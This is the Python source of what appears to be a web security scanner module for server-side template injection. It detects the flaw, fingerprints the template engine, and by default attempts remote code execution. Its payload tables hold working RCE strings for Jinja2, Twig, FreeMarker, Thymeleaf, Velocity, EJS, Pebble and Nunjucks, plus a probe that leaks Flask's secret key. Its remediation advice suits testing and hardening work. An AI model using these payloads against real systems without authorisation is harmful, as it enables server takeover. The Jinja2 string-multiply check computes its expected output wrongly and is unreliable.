"""
BEATRIX Server-Side Template Injection (SSTI) Scanner

Born from: OWASP WSTG-INPV-18 + PortSwigger SSTI research (James Kettle)
https://portswigger.net/web-security/server-side-template-injection

TECHNIQUE:
1. Detect template injection via math expression evaluation ({{7*7}} → 49)
2. Identify the template engine via engine-specific polyglot payloads
3. Escalate to Remote Code Execution via sandbox escape
4. Test all input vectors: URL params, POST body, headers, cookies

ENGINE IDENTIFICATION DECISION TREE:
    {{7*7}} → 49?
      ├─ YES → {{7*'7'}} → 7777777?
      │         ├─ YES → Jinja2 / Twig
      │         └─ NO → Unknown (needs more probing)
      └─ NO → ${7*7} → 49?
               ├─ YES → EL / Freemarker / Thymeleaf / Mako
               └─ NO → #{7*7} → 49?
                        ├─ YES → Ruby ERB / Slim
                        └─ NO → <% 7*7 %> → 49?
                                 ├─ YES → EJS / ERB / JSP
                                 └─ NO → Not injectable (or custom engine)

SEVERITY: CRITICAL — SSTI almost always escalates to RCE:
- Jinja2: config.__class__.__init__.__globals__['os'].popen('id').read()
- Twig: {{_self.env.registerUndefinedFilterCallback("exec")}} → {{_self.env.getFilter("id")}}
- Freemarker: ${"freemarker.template.utility.Execute"?new()("id")}
- Thymeleaf: __${T(java.lang.Runtime).getRuntime().exec('id')}__
- Pebble: {% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime')... %}

OWASP: WSTG-INPV-18 (Testing for Server-Side Template Injection)
       A03:2021 - Injection

MITRE: T1190 (Exploit Public-Facing Application)
       T1059 (Command and Scripting Interpreter)

CWE: CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine)
     CWE-94 (Improper Control of Generation of Code — Code Injection)

REFERENCES:
- https://portswigger.net/web-security/server-side-template-injection
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
"""

import asyncio
import random
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import AsyncIterator, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse

try:
    import httpx
except ImportError:
    httpx = None

from beatrix.core.types import Confidence, Finding, Severity

from .base import BaseScanner, ScanContext

# =============================================================================
# DATA MODELS
# =============================================================================

class TemplateEngine(Enum):
    """Known server-side template engines"""
    JINJA2 = "Jinja2"             # Python (Flask, Django)
    TWIG = "Twig"                 # PHP (Symfony)
    FREEMARKER = "FreeMarker"     # Java
    THYMELEAF = "Thymeleaf"       # Java (Spring)
    VELOCITY = "Velocity"         # Java
    MAKO = "Mako"                 # Python
    PEBBLE = "Pebble"             # Java
    SMARTY = "Smarty"             # PHP
    ERB = "ERB"                   # Ruby (Rails)
    SLIM = "Slim"                 # Ruby
    EJS = "EJS"                   # Node.js
    PUG = "Pug"                   # Node.js (formerly Jade)
    NUNJUCKS = "Nunjucks"         # Node.js
    HANDLEBARS = "Handlebars"     # Node.js
    MUSTACHE = "Mustache"         # Multi-language
    TORNADO = "Tornado"           # Python
    DJANGO = "DjangoTemplates"    # Python (Django)
    UNKNOWN = "Unknown"


class InjectionContext(Enum):
    """Where the injection point is"""
    URL_PARAM = "url_parameter"
    POST_BODY = "post_body"
    HEADER = "header"
    COOKIE = "cookie"
    PATH = "url_path"
    JSON_VALUE = "json_value"


@dataclass
class SSTIPayload:
    """An SSTI test payload"""
    name: str
    template: str              # The injection template string
    expected_output: str       # What to look for in response
    engine: Optional[TemplateEngine] = None  # Which engine this targets
    stage: str = "detect"      # detect, identify, exploit
    is_blind: bool = False     # If True, use OOB/timing detection
    rce_payload: bool = False  # If True, this attempts code execution
    description: str = ""


@dataclass
class SSTICandidate:
    """A confirmed or suspected SSTI injection point"""
    url: str
    param_name: str
    context: InjectionContext
    engine: Optional[TemplateEngine] = None
    confirmed: bool = False
    rce_confirmed: bool = False
    payloads_tested: List[str] = field(default_factory=list)
    evidence: str = ""


# =============================================================================
# PAYLOAD DATABASE
# =============================================================================

def _generate_detection_payloads() -> List[SSTIPayload]:
    """
    Generate SSTI detection payloads.

    Uses random integers to avoid false positives from cached/static content.
    The key insight: we use math operations that produce unique results.
    """
    # Use random numbers to generate unique expected outputs
    a = random.randint(100, 999)
    b = random.randint(100, 999)
    expected = str(a * b)

    payloads = []

    # ---- Stage 1: Universal detection ----

    # Jinja2 / Twig / Nunjucks (double curly braces)
    payloads.append(SSTIPayload(
        name="Mustache/Jinja2/Twig detect",
        template=f"{{{{{a}*{b}}}}}",
        expected_output=expected,
        stage="detect",
        description=f"{{{{{a}*{b}}}}} → {expected} if template engine evaluates expressions",
    ))

    # Jinja2 string multiplication (distinguishes from Twig)
    payloads.append(SSTIPayload(
        name="Jinja2 string multiply",
        template=f"{{{{{a}*'{b}'}}}}",
        expected_output=str(b) * a if a < 10 else str(b) * 3,  # Cap for sanity
        engine=TemplateEngine.JINJA2,
        stage="identify",
        description="String multiplication — Jinja2 produces repeated string, Twig doesn't",
    ))

    # ${} syntax — Freemarker, Mako, EL, Thymeleaf
    payloads.append(SSTIPayload(
        name="Dollar-brace detect (Freemarker/Mako/EL)",
        template=f"${{{a}*{b}}}",
        expected_output=expected,
        stage="detect",
        description=f"${{{a}*{b}}} → {expected} for FreeMarker, Mako, Java EL",
    ))

    # #{} syntax — Ruby ERB, Spring EL, Thymeleaf
    payloads.append(SSTIPayload(
        name="Hash-brace detect (ERB/SpringEL)",
        template=f"#{{{a}*{b}}}",
        expected_output=expected,
        stage="detect",
        description=f"#{{{a}*{b}}} → {expected} for Ruby ERB, Spring EL",
    ))

    # <% %> syntax — ERB, EJS, JSP
    payloads.append(SSTIPayload(
        name="ERB/EJS/JSP detect",
        template=f"<%={a}*{b}%>",
        expected_output=expected,
        stage="detect",
        description=f"<%={a}*{b}%> → {expected} for ERB, EJS, JSP scriptlets",
    ))

    # @() syntax — Razor (C#/.NET)
    payloads.append(SSTIPayload(
        name="Razor detect",
        template=f"@({a}*{b})",
        expected_output=expected,
        stage="detect",
        description=f"@({a}*{b}) → {expected} for ASP.NET Razor",
    ))

    # Tornado template
    payloads.append(SSTIPayload(
        name="Tornado detect",
        template=f"{{% import os %}}{{{{{a}*{b}}}}}",
        expected_output=expected,
        engine=TemplateEngine.TORNADO,
        stage="detect",
        description="Tornado template with import + expression",
    ))

    # Smarty
    payloads.append(SSTIPayload(
        name="Smarty detect",
        template=f"{{${a}*{b}}}",
        expected_output=expected,
        engine=TemplateEngine.SMARTY,
        stage="detect",
        description=f"Smarty math expression: {{${a}*{b}}}",
    ))

    return payloads


def _generate_identification_payloads() -> List[SSTIPayload]:
    """
    Generate engine-specific identification payloads.

    After detecting that template injection is possible, these
    payloads determine WHICH engine is in use.
    """
    payloads = []

    # Jinja2 specific — access class hierarchy
    payloads.append(SSTIPayload(
        name="Jinja2 class access",
        template="{{''.__class__.__mro__}}",
        expected_output="<class 'str'>",
        engine=TemplateEngine.JINJA2,
        stage="identify",
        description="Python MRO access — only works in Jinja2/Mako with Python backend",
    ))

    # Jinja2 config access
    payloads.append(SSTIPayload(
        name="Jinja2 config",
        template="{{config}}",
        expected_output="SECRET_KEY",
        engine=TemplateEngine.JINJA2,
        stage="identify",
        description="Flask config object — leaks secret key if accessible",
    ))

    # Twig specific
    payloads.append(SSTIPayload(
        name="Twig version",
        template="{{_self.env.getExtension('Twig\\Extension\\CoreExtension')}}",
        expected_output="Twig",
        engine=TemplateEngine.TWIG,
        stage="identify",
        description="Twig environment access",
    ))

    # Twig — dump all vars
    payloads.append(SSTIPayload(
        name="Twig dump",
        template="{{dump()}}",
        expected_output="array",
        engine=TemplateEngine.TWIG,
        stage="identify",
        description="Twig dump() function — reveals all template variables",
    ))

    # Freemarker specific
    payloads.append(SSTIPayload(
        name="Freemarker class",
        template="${.dataModel.class.name}",
        expected_output=".",
        engine=TemplateEngine.FREEMARKER,
        stage="identify",
        description="Freemarker data model class access",
    ))

    # Freemarker version
    payloads.append(SSTIPayload(
        name="Freemarker version",
        template="${.version}",
        expected_output="2.",
        engine=TemplateEngine.FREEMARKER,
        stage="identify",
        description="Freemarker version disclosure",
    ))

    # Thymeleaf specific (Spring)
    payloads.append(SSTIPayload(
        name="Thymeleaf SpEL",
        template="__${T(java.lang.Math).random()}__",
        expected_output="0.",
        engine=TemplateEngine.THYMELEAF,
        stage="identify",
        description="Thymeleaf preprocessing with Spring EL",
    ))

    # Pebble
    payloads.append(SSTIPayload(
        name="Pebble bean list",
        template='{{ beans }}',
        expected_output="org.springframework",
        engine=TemplateEngine.PEBBLE,
        stage="identify",
        description="Pebble Spring beans access",
    ))

    # Velocity
    payloads.append(SSTIPayload(
        name="Velocity class access",
        template="#set($x=1+1)$x",
        expected_output="2",
        engine=TemplateEngine.VELOCITY,
        stage="identify",
        description="Velocity variable assignment and evaluation",
    ))

    # Handlebars
    payloads.append(SSTIPayload(
        name="Handlebars prototype",
        template="{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{/with}}{{/with}}{{/with}}",
        expected_output="function",
        engine=TemplateEngine.HANDLEBARS,
        stage="identify",
        description="Handlebars prototype pollution via lookup helper",
    ))

    # EJS
    payloads.append(SSTIPayload(
        name="EJS process",
        template="<%= process.version %>",
        expected_output="v",
        engine=TemplateEngine.EJS,
        stage="identify",
        description="EJS Node.js process version disclosure",
    ))

    # Nunjucks
    payloads.append(SSTIPayload(
        name="Nunjucks range",
        template="{{range(10)}}",
        expected_output="0,1,2,3,4,5,6,7,8,9",
        engine=TemplateEngine.NUNJUCKS,
        stage="identify",
        description="Nunjucks range function (distinct from Jinja2)",
    ))

    return payloads


def _generate_exploit_payloads() -> Dict[TemplateEngine, List[SSTIPayload]]:
    """
    Generate RCE exploit payloads per engine.

    These are PROOF OF CONCEPT payloads using the 'id' command.
    They demonstrate RCE capability without destructive actions.
    """
    exploits: Dict[TemplateEngine, List[SSTIPayload]] = {}

    # Jinja2 RCE payloads (Python)
    exploits[TemplateEngine.JINJA2] = [
        SSTIPayload(
            name="Jinja2 RCE via MRO",
            template=(
                "{{''.__class__.__mro__[1].__subclasses__()[408]"
                "('id',shell=True,stdout=-1).communicate()[0]}}"
            ),
            expected_output="uid=",
            engine=TemplateEngine.JINJA2,
            stage="exploit",
            rce_payload=True,
            description="Jinja2 RCE via Python MRO → subprocess.Popen",
        ),
        SSTIPayload(
            name="Jinja2 RCE via cycler",
            template=(
                "{{cycler.__init__.__globals__.os.popen('id').read()}}"
            ),
            expected_output="uid=",
            engine=TemplateEngine.JINJA2,
            stage="exploit",
            rce_payload=True,
            description="Jinja2 RCE via cycler globals → os.popen",
        ),
        SSTIPayload(
            name="Jinja2 RCE via lipsum",
            template=(
                "{{lipsum.__globals__['os'].popen('id').read()}}"
            ),
            expected_output="uid=",
            engine=TemplateEngine.JINJA2,
            stage="exploit",
            rce_payload=True,
            description="Jinja2 RCE via lipsum globals → os.popen",
        ),
        SSTIPayload(
            name="Jinja2 RCE via request",
            template=(
                "{{request.application.__self__._get_data_for_json.__globals__"
                "['json'].JSONEncoder.default.__globals__['current_app']"
                ".wsgi_app.__globals__['__builtins__']['__import__']('os')"
                ".popen('id').read()}}"
            ),
            expected_output="uid=",
            engine=TemplateEngine.JINJA2,
            stage="exploit",
            rce_payload=True,
            description="Jinja2 RCE via Flask request object chain",
        ),
    ]

    # Twig RCE payloads (PHP)
    exploits[TemplateEngine.TWIG] = [
        SSTIPayload(
            name="Twig RCE via filter callback",
            template=(
                "{{_self.env.registerUndefinedFilterCallback('system')}}"
                "{{_self.env.getFilter('id')}}"
            ),
            expected_output="uid=",
            engine=TemplateEngine.TWIG,
            stage="exploit",
            rce_payload=True,
            description="Twig <1.20 RCE via undefined filter callback → system()",
        ),
        SSTIPayload(
            name="Twig RCE via map filter",
            template="{{['id']|map('system')|join}}",
            expected_output="uid=",
            engine=TemplateEngine.TWIG,
            stage="exploit",
            rce_payload=True,
            description="Twig 1.x/2.x/3.x RCE via map filter → system()",
        ),
        SSTIPayload(
            name="Twig RCE via sort filter",
            template="{{['id',0]|sort('system')|join}}",
            expected_output="uid=",
            engine=TemplateEngine.TWIG,
            stage="exploit",
            rce_payload=True,
            description="Twig RCE via sort filter → system()",
        ),
    ]

    # Freemarker RCE payloads (Java)
    exploits[TemplateEngine.FREEMARKER] = [
        SSTIPayload(
            name="Freemarker RCE via Execute",
            template='${"freemarker.template.utility.Execute"?new()("id")}',
            expected_output="uid=",
            engine=TemplateEngine.FREEMARKER,
            stage="exploit",
            rce_payload=True,
            description="Freemarker RCE via built-in Execute utility",
        ),
        SSTIPayload(
            name="Freemarker RCE via ObjectConstructor",
            template='${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["id"]).start()}',
            expected_output="java.lang.Process",
            engine=TemplateEngine.FREEMARKER,
            stage="exploit",
            rce_payload=True,
            description="Freemarker RCE via ObjectConstructor → ProcessBuilder",
        ),
    ]

    # Thymeleaf RCE payloads (Java — Spring)
    exploits[TemplateEngine.THYMELEAF] = [
        SSTIPayload(
            name="Thymeleaf RCE via Runtime",
            template="__${T(java.lang.Runtime).getRuntime().exec('id')}__",
            expected_output="Process",
            engine=TemplateEngine.THYMELEAF,
            stage="exploit",
            rce_payload=True,
            description="Thymeleaf RCE via SpEL → Runtime.exec()",
        ),
        SSTIPayload(
            name="Thymeleaf RCE via ScriptEngine",
            template=(
                "__${T(javax.script.ScriptEngineManager).newInstance()"
                ".getEngineByName('js').eval('java.lang.Runtime.getRuntime()"
                ".exec(\"id\")')}__"
            ),
            expected_output="Process",
            engine=TemplateEngine.THYMELEAF,
            stage="exploit",
            rce_payload=True,
            description="Thymeleaf RCE via JavaScript ScriptEngine",
        ),
    ]

    # Velocity RCE (Java)
    exploits[TemplateEngine.VELOCITY] = [
        SSTIPayload(
            name="Velocity RCE via Runtime",
            template='#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($ob=$rt.getMethod("getRuntime"))#set($pr=$ob.invoke($x))$pr.exec("id")',
            expected_output="Process",
            engine=TemplateEngine.VELOCITY,
            stage="exploit",
            rce_payload=True,
            description="Velocity RCE via reflection → Runtime.exec()",
        ),
    ]

    # EJS RCE payloads (Node.js)
    exploits[TemplateEngine.EJS] = [
        SSTIPayload(
            name="EJS RCE via child_process",
            template="<%= require('child_process').execSync('id').toString() %>",
            expected_output="uid=",
            engine=TemplateEngine.EJS,
            stage="exploit",
            rce_payload=True,
            description="EJS RCE via Node.js child_process.execSync()",
        ),
    ]

    # Pebble RCE (Java)
    exploits[TemplateEngine.PEBBLE] = [
        SSTIPayload(
            name="Pebble RCE via forName",
            template=(
                '{% set cmd = "id" %}'
                '{% set bytes = (1).TYPE.forName("java.lang.Runtime")'
                '.methods[6].invoke(null,null).exec(cmd) %}'
                '{{ bytes }}'
            ),
            expected_output="Process",
            engine=TemplateEngine.PEBBLE,
            stage="exploit",
            rce_payload=True,
            description="Pebble RCE via class forName → Runtime.exec()",
        ),
    ]

    # Nunjucks RCE (Node.js)
    exploits[TemplateEngine.NUNJUCKS] = [
        SSTIPayload(
            name="Nunjucks RCE via constructor",
            template=(
                "{{constructor.constructor('return this.process.mainModule"
                ".require(\"child_process\").execSync(\"id\").toString()')()"
                "}}"
            ),
            expected_output="uid=",
            engine=TemplateEngine.NUNJUCKS,
            stage="exploit",
            rce_payload=True,
            description="Nunjucks RCE via Function constructor → child_process",
        ),
    ]

    return exploits


# =============================================================================
# SCANNER
# =============================================================================

class SSTIScanner(BaseScanner):
    """
    Server-Side Template Injection scanner.

    Follows the PortSwigger SSTI methodology:
    1. DETECT: Send math expression payloads ({{7*7}}, ${7*7}, etc.)
    2. IDENTIFY: Use engine-specific probes to fingerprint the template engine
    3. EXPLOIT: Attempt RCE proof-of-concept with engine-specific payloads

    All injection points are tested: URL params, POST body, headers, cookies.
    """

    name = "ssti"
    description = "Server-Side Template Injection Scanner (detect + identify + exploit)"
    version = "1.0.0"
    author = "BEATRIX"

    owasp_category = "WSTG-INPV-18"
    mitre_technique = "T1190"

    checks = [
        "SSTI detection via math evaluation",
        "Template engine identification",
        "RCE proof-of-concept exploitation",
        "Blind SSTI via timing/OOB",
        "Multi-context injection (params, headers, cookies)",
    ]

    def __init__(self, config: Optional[Dict] = None):
        super().__init__(config)
        self.attempt_rce = self.config.get("attempt_rce", True)
        self.test_headers = self.config.get("test_headers", True)
        self.test_cookies = self.config.get("test_cookies", True)
        self.candidates: List[SSTICandidate] = []
        self.detected_engines: Set[TemplateEngine] = set()

        # Payload databases (regenerated each scan for unique values)
        self._detection_payloads: List[SSTIPayload] = []
        self._identification_payloads: List[SSTIPayload] = []
        self._exploit_payloads: Dict[TemplateEngine, List[SSTIPayload]] = {}

    def _init_payloads(self):
        """Initialize payload databases with fresh random values"""
        self._detection_payloads = _generate_detection_payloads()
        self._identification_payloads = _generate_identification_payloads()
        self._exploit_payloads = _generate_exploit_payloads()

    # =========================================================================
    # MAIN SCAN
    # =========================================================================

    async def scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """
        Full SSTI scan: detect → identify → exploit.

        Tests all parameters and input vectors for template injection.
        """
        self._init_payloads()
        self.log(f"Starting SSTI scan on {context.url}")
        self.log(f"Parameters: {list(context.parameters.keys())}")

        # Phase 1: Detection — test each parameter with detection payloads
        detected_params: List[Tuple[str, InjectionContext, SSTIPayload]] = []

        for param_name, param_value in context.parameters.items():
            self.log(f"Testing parameter: {param_name}")

            for payload in self._detection_payloads:
                if await self._test_injection(
                    context, param_name, payload, InjectionContext.URL_PARAM
                ):
                    detected_params.append((param_name, InjectionContext.URL_PARAM, payload))

                    yield self.create_finding(
                        title=f"SSTI Detected in Parameter '{param_name}'",
                        severity=Severity.HIGH,
                        confidence=Confidence.FIRM,
                        url=context.url,
                        description=(
                            f"Server-Side Template Injection detected in parameter "
                            f"'{param_name}' using payload: {payload.template}\n\n"
                            f"The server evaluated the mathematical expression and "
                            f"returned the result '{payload.expected_output}', confirming "
                            f"that user input is being processed by a template engine.\n\n"
                            f"**Next Steps:** Engine identification and RCE exploitation."
                        ),
                        evidence=f"Payload: {payload.template} → Output: {payload.expected_output}",
                        request=f"GET {context.url}?{param_name}={payload.template}",
                        references=[
                            "https://portswigger.net/web-security/server-side-template-injection",
                            "OWASP WSTG-INPV-18",
                            "CWE-1336",
                        ],
                    )

                    break  # One detection payload is enough, move to identification

        # Also test headers if configured
        if self.test_headers:
            injectable_headers = [
                "User-Agent", "Referer", "X-Forwarded-For",
                "X-Forwarded-Host", "Accept-Language",
            ]
            for header_name in injectable_headers:
                for payload in self._detection_payloads[:3]:  # Limit header tests
                    if await self._test_header_injection(context, header_name, payload):
                        detected_params.append((header_name, InjectionContext.HEADER, payload))

                        yield self.create_finding(
                            title=f"SSTI Detected in Header '{header_name}'",
                            severity=Severity.HIGH,
                            confidence=Confidence.FIRM,
                            url=context.url,
                            description=(
                                f"Server-Side Template Injection detected in HTTP header "
                                f"'{header_name}'. The header value is being processed by "
                                f"a template engine.\n\n"
                                f"Header injection is often HIGHER severity because:\n"
                                f"- Headers are less likely to be sanitized\n"
                                f"- WAFs often ignore header values\n"
                                f"- Can be triggered via CSRF in some cases"
                            ),
                            evidence=f"Header: {header_name}: {payload.template} → {payload.expected_output}",
                            references=["OWASP WSTG-INPV-18", "CWE-1336"],
                        )
                        break

        if not detected_params:
            self.log("No SSTI detected in any parameter")
            return

        # Phase 2: Identification — determine which template engine
        for param_name, inject_ctx, _det_payload in detected_params:
            engine = await self._identify_engine(context, param_name, inject_ctx)

            if engine and engine != TemplateEngine.UNKNOWN:
                self.detected_engines.add(engine)

                yield self.create_finding(
                    title=f"Template Engine Identified: {engine.value}",
                    severity=Severity.HIGH,
                    confidence=Confidence.FIRM,
                    url=context.url,
                    description=(
                        f"Template engine identified as **{engine.value}** in parameter "
                        f"'{param_name}'.\n\n"
                        f"This narrows the attack surface to {engine.value}-specific "
                        f"exploitation techniques."
                    ),
                    evidence=f"Engine: {engine.value}",
                    references=[
                        "https://portswigger.net/web-security/server-side-template-injection",
                    ],
                )

                # Phase 3: Exploitation — attempt RCE PoC
                if self.attempt_rce and engine in self._exploit_payloads:
                    async for finding in self._attempt_exploitation(
                        context, param_name, inject_ctx, engine
                    ):
                        yield finding

    async def passive_scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """
        Passive detection of template engine indicators.

        Checks response for:
        - Template engine error messages / stack traces
        - Template syntax in reflected content
        - Server headers indicating template frameworks
        """
        if context.response is None:
            return

        response_text = ""
        if hasattr(context.response, 'body'):
            response_text = context.response.body
        elif hasattr(context.response, 'text'):
            response_text = context.response.text

        # Error message patterns that reveal template engines
        engine_errors = {
            TemplateEngine.JINJA2: [
                r'jinja2\.exceptions\.',
                r'UndefinedError',
                r'TemplateSyntaxError',
                r'jinja2\.sandbox',
            ],
            TemplateEngine.TWIG: [
                r'Twig_Error',
                r'Twig\\Error',
                r'twig\.error',
            ],
            TemplateEngine.FREEMARKER: [
                r'freemarker\.template\.',
                r'FreeMarkerException',
                r'freemarker\.core\.',
            ],
            TemplateEngine.THYMELEAF: [
                r'org\.thymeleaf\.',
                r'ThymeleafException',
                r'TemplateProcessingException',
            ],
            TemplateEngine.VELOCITY: [
                r'org\.apache\.velocity\.',
                r'VelocityException',
                r'ParseErrorException',
            ],
            TemplateEngine.MAKO: [
                r'mako\.exceptions\.',
                r'MakoException',
                r'mako\.template\.',
            ],
            TemplateEngine.PEBBLE: [
                r'com\.mitchellbosecke\.pebble\.',
                r'PebbleException',
            ],
            TemplateEngine.EJS: [
                r'ejs\.renderFile',
                r'Could not find matching close tag',
            ],
            TemplateEngine.PUG: [
                r'Pug:.*error',
                r'unexpected token.*pug',
            ],
            TemplateEngine.DJANGO: [
                r'TemplateSyntaxError at\s+/',
                r'django\.template\.',
                r'Invalid filter',
            ],
            TemplateEngine.ERB: [
                r'ActionView::Template::Error',
                r'erb.*SyntaxError',
            ],
        }

        for engine, patterns in engine_errors.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    yield self.create_finding(
                        title=f"Template Engine Error Disclosure: {engine.value}",
                        severity=Severity.MEDIUM,
                        confidence=Confidence.FIRM,
                        url=context.url,
                        description=(
                            f"Response contains error messages from the {engine.value} "
                            f"template engine. This confirms the technology stack and indicates "
                            f"that template errors are not properly handled.\n\n"
                            f"If user input reaches the template rendering context, "
                            f"SSTI → RCE is likely possible."
                        ),
                        evidence=f"Pattern matched: {pattern}",
                        remediation=(
                            "1. Configure custom error pages (disable debug mode)\n"
                            "2. Never include raw user input in template strings\n"
                            "3. Use the template engine's sandbox mode if available\n"
                            f"4. Apply {engine.value}-specific hardening"
                        ),
                        references=["OWASP WSTG-INPV-18", "CWE-209"],
                    )
                    break

    # =========================================================================
    # INJECTION TESTING
    # =========================================================================

    async def _test_injection(
        self,
        context: ScanContext,
        param_name: str,
        payload: SSTIPayload,
        inject_ctx: InjectionContext,
    ) -> bool:
        """
        Test a single parameter with an SSTI payload.
        Returns True if the expected output is found in the response.
        """
        try:
            # Build the URL with injected parameter
            params = dict(context.parameters)
            params[param_name] = payload.template

            response = await self.get(
                context.base_url + urlparse(context.url).path,
                params=params,
            )

            # Check if expected output appears in response
            if payload.expected_output in response.text:
                # Verify it's not a false positive (the expected string might
                # already exist in the page without our payload)

                # Send a baseline request with a non-template value
                baseline_params = dict(context.parameters)
                baseline_params[param_name] = f"beatrix_baseline_{random.randint(1000,9999)}"

                baseline_response = await self.get(
                    context.base_url + urlparse(context.url).path,
                    params=baseline_params,
                )

                # If the expected output is NOT in the baseline, it's a true positive
                if payload.expected_output not in baseline_response.text:
                    self.log(f"  ✓ SSTI confirmed: {param_name} → {payload.name}")
                    return True

            await asyncio.sleep(0.5)  # Rate limiting

        except Exception as e:
            self.log(f"  Error testing {param_name} with {payload.name}: {e}")

        return False

    async def _test_header_injection(
        self,
        context: ScanContext,
        header_name: str,
        payload: SSTIPayload,
    ) -> bool:
        """Test a header for SSTI"""
        try:
            headers = {header_name: payload.template}
            response = await self.get(context.url, headers=headers)

            if payload.expected_output in response.text:
                # Baseline check
                baseline_headers = {header_name: f"beatrix_baseline_{random.randint(1000,9999)}"}
                baseline = await self.get(context.url, headers=baseline_headers)

                if payload.expected_output not in baseline.text:
                    self.log(f"  ✓ SSTI in header: {header_name} → {payload.name}")
                    return True

            await asyncio.sleep(0.5)

        except Exception as e:
            self.log(f"  Error testing header {header_name}: {e}")

        return False

    async def _identify_engine(
        self,
        context: ScanContext,
        param_name: str,
        inject_ctx: InjectionContext,
    ) -> Optional[TemplateEngine]:
        """
        Identify the template engine using engine-specific probes.

        Returns the identified TemplateEngine or UNKNOWN.
        """
        self.log(f"Identifying template engine for {param_name}")

        for payload in self._identification_payloads:
            try:
                if inject_ctx == InjectionContext.URL_PARAM:
                    params = dict(context.parameters)
                    params[param_name] = payload.template
                    response = await self.get(
                        context.base_url + urlparse(context.url).path,
                        params=params,
                    )
                elif inject_ctx == InjectionContext.HEADER:
                    response = await self.get(
                        context.url,
                        headers={param_name: payload.template},
                    )
                else:
                    continue

                if payload.expected_output in response.text:
                    self.log(f"  ✓ Engine identified: {payload.engine.value} ({payload.name})")
                    return payload.engine

                await asyncio.sleep(0.5)

            except Exception as e:
                self.log(f"  Error with {payload.name}: {e}")
                continue

        return TemplateEngine.UNKNOWN

    async def _attempt_exploitation(
        self,
        context: ScanContext,
        param_name: str,
        inject_ctx: InjectionContext,
        engine: TemplateEngine,
    ) -> AsyncIterator[Finding]:
        """
        Attempt RCE exploitation with engine-specific payloads.

        Only runs 'id' command as proof of concept.
        """
        self.log(f"Attempting RCE exploitation for {engine.value}")

        if engine not in self._exploit_payloads:
            self.log(f"  No exploit payloads for {engine.value}")
            return

        for payload in self._exploit_payloads[engine]:
            try:
                if inject_ctx == InjectionContext.URL_PARAM:
                    params = dict(context.parameters)
                    params[param_name] = payload.template
                    response = await self.get(
                        context.base_url + urlparse(context.url).path,
                        params=params,
                    )
                elif inject_ctx == InjectionContext.HEADER:
                    response = await self.get(
                        context.url,
                        headers={param_name: payload.template},
                    )
                else:
                    continue

                if payload.expected_output in response.text:
                    # Extract the command output
                    rce_output = self._extract_rce_output(response.text, payload.expected_output)

                    yield self.create_finding(
                        title=f"SSTI → RCE CONFIRMED ({engine.value})",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.CERTAIN,
                        url=context.url,
                        description=(
                            f"**CRITICAL: Remote Code Execution achieved via SSTI**\n\n"
                            f"Template Engine: {engine.value}\n"
                            f"Parameter: {param_name}\n"
                            f"Exploit: {payload.name}\n\n"
                            f"The 'id' command was executed on the server:\n"
                            f"```\n{rce_output}\n```\n\n"
                            f"**Impact:** Complete server compromise. An attacker can:\n"
                            f"- Execute arbitrary commands\n"
                            f"- Read/write files on the server\n"
                            f"- Pivot to internal network\n"
                            f"- Exfiltrate the database\n"
                            f"- Install backdoors"
                        ),
                        evidence=f"RCE output: {rce_output}",
                        request=(
                            f"GET {context.url}?{param_name}="
                            f"{payload.template[:100]}..."
                        ),
                        remediation=(
                            "1. NEVER pass user input directly to template rendering\n"
                            "2. Use the template engine in sandbox/safe mode\n"
                            f"3. {engine.value}-specific hardening:\n"
                            + self._get_engine_remediation(engine)
                        ),
                        references=[
                            "https://portswigger.net/web-security/server-side-template-injection",
                            "OWASP WSTG-INPV-18",
                            "CWE-1336",
                            "CWE-94",
                        ],
                    )

                    return  # One confirmed RCE is enough

                await asyncio.sleep(1.0)

            except Exception as e:
                self.log(f"  Exploit error {payload.name}: {e}")
                continue

    # =========================================================================
    # HELPERS
    # =========================================================================

    def _extract_rce_output(self, response_text: str, marker: str) -> str:
        """Extract command output from response, starting at the expected marker"""
        idx = response_text.find(marker)
        if idx == -1:
            return "(output not cleanly extracted)"

        # Grab text from marker to next HTML tag or end
        output = response_text[idx:idx + 200]
        # Strip HTML tags
        output = re.sub(r'<[^>]+>', '', output)
        # Trim whitespace
        output = output.strip()

        return output[:200]

    def _get_engine_remediation(self, engine: TemplateEngine) -> str:
        """Engine-specific remediation advice"""
        remediations = {
            TemplateEngine.JINJA2: (
                "   - Use Jinja2 SandboxedEnvironment\n"
                "   - Remove dangerous globals (cycler, lipsum, config)\n"
                "   - Disable autoescape=False on user-rendered templates\n"
                "   - Use render_template_string() with extreme caution"
            ),
            TemplateEngine.TWIG: (
                "   - Upgrade to Twig 3.x with sandbox policy\n"
                "   - Use Twig_Sandbox_SecurityPolicy with allowlists\n"
                "   - Disable dangerous filters: map, sort, reduce\n"
                "   - Never use _self in templates"
            ),
            TemplateEngine.FREEMARKER: (
                "   - Use freemarker.template.Configuration.setNewBuiltinClassResolver\n"
                "   - Disable ?new built-in\n"
                "   - Use TemplateClassResolver.UNRESTRICTED_RESOLVER → SAFER_RESOLVER\n"
                "   - Block access to freemarker.template.utility package"
            ),
            TemplateEngine.THYMELEAF: (
                "   - Disable SpEL preprocessing (__${...}__)\n"
                "   - Use th:text instead of th:utext\n"
                "   - Configure SpringEL SecurityContextHolder\n"
                "   - Upgrade to Thymeleaf 3.1+ with restricted SpEL"
            ),
            TemplateEngine.EJS: (
                "   - Never pass user input to ejs.render()\n"
                "   - Use <%- %> (escaped) instead of <%= %> (unescaped)\n"
                "   - Disable dynamic template compilation\n"
                "   - Consider switching to a logic-less template engine"
            ),
        }

        return remediations.get(engine, "   - Consult engine-specific security documentation")
